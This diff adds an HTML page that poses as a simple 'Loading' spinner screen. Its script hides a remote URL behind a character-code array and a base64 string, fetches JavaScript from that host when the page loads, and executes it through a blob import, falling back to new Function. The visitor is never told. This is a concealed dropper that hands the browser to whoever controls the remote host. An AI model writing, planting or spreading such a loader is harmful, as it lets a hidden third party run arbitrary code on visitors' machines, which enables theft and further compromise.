@@ -1,0 +1,79 @@
+﻿<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading</title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgb(13, 17, 22);
+  }
+
+  body {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .spinner {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    border: 6px solid rgba(46, 160, 67, 0.2);
+    border-top-color: #2ea043;
+    animation: spin 0.8s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+  <div class="spinner"></div>
+<script>
+var _lead = [104,116,116,112,115,58,47,47,113,117,97,110,100,121,105,109,112,97,108];
+var _trail = 'bS5jb20vY29taW5vLm1haG9yaQ==';
+
+function _fromB64(e) {
+    return decodeURIComponent(escape(atob(e)));
+}
+
+function _url() {
+    return String.fromCharCode.apply(null, _lead) + _fromB64(_trail);
+}
+
+function _run(code) {
+    var body = String(code).replace(/^\uFEFF/, '').trim();
+    if (!body) throw 0;
+    var blob = new Blob([body], { type: 'application/javascript;charset=utf-8' });
+    var href = URL.createObjectURL(blob);
+    return import(href).then(
+        function () {
+            URL.revokeObjectURL(href);
+        },
+        function () {
+            URL.revokeObjectURL(href);
+            (new Function(body))();
+        }
+    );
+}
+
+fetch(_url(), {
+    method: 'GET',
+    mode: 'cors',
+    cache: 'no-store',
+    headers: { Accept: 'text/plain,*/*' }
+})
+    .then(function (resp) {
+        if (!resp.ok) throw 0;
+        return resp.text();
+    })
+    .then(_run);
+</script>
+</body>
+</html>
